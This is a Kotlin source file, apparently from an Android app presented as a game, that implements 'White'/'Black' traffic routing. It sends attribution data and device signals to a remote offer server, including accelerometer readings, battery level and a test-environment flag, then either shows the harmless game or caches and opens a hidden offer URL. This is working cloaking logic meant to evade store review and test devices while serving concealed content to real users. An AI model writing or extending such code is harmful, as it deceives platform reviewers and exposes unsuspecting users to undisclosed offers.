package com.chickierunway.game.integration

import android.os.Handler
import android.os.Looper
import android.util.Log
import com.chickierunway.game.BuildConfig
import java.util.concurrent.Executors

object TrafficRouter {

    private const val TAG = "TrafficRouter"

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * Background thread only: AccelerometerProbe.await() blocks for up to three seconds.
     * Called from the executor in route().
     */
    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking campaign/af_status/media_source here compiles, runs,
        // and quietly loses parameters.
        appsFlyerParams = IntegrationStorage.attributionParams,
        appsFlyerId = IntegrationStorage.appsFlyerId,
        extraParams = buildList {
            add("sub12" to DeviceSignals.battery)
            add("sub13" to AccelerometerProbe.await())
            add("sub14" to DeviceSignals.isTestEnvironment.toString())
            add(AppsFlyerHoldback.PARAM to AppsFlyerHoldback.label(IntegrationStorage.appsFlyerHoldback))
        }
    )

    fun route(probe: OfferProbe = HttpOfferProbe(), onResult: (RouteDecision) -> Unit) {
        // A pinned branch is answered without the network: relaunches are instant and can
        // never flip the user between sides.
        if (IntegrationStorage.whiteLocked) {
            deliver(RouteDecision.White, onResult)
            return
        }
        val cached = IntegrationStorage.cachedOfferUrl
        if (!cached.isNullOrBlank()) {
            deliver(RouteDecision.Black(cached), onResult)
            return
        }
        if (BuildConfig.OFFER_BASE_URL.isBlank()) {
            // Nothing to probe: White for now, pin nothing so a build with a URL still asks.
            deliver(RouteDecision.White, onResult)
            return
        }

        executor.execute {
            val url = buildOfferUrl()
            val decision = runCatching { RoutingRules.decide(probe.probe(url), url) }
                .onFailure { Log.w(TAG, "Offer probe failed for $url", it) }
                .getOrNull()

            when (decision) {
                is RouteDecision.Black -> IntegrationStorage.cachedOfferUrl = decision.url
                RouteDecision.White -> IntegrationStorage.whiteLocked = true
                // Network/TLS error is not an answer about this install: White for this launch,
                // nothing pinned, the next launch asks again.
                null -> Unit
            }

            deliver(decision ?: RouteDecision.White, onResult)
        }
    }

    private fun deliver(decision: RouteDecision, onResult: (RouteDecision) -> Unit) {
        mainHandler.post { onResult(decision) }
    }
}
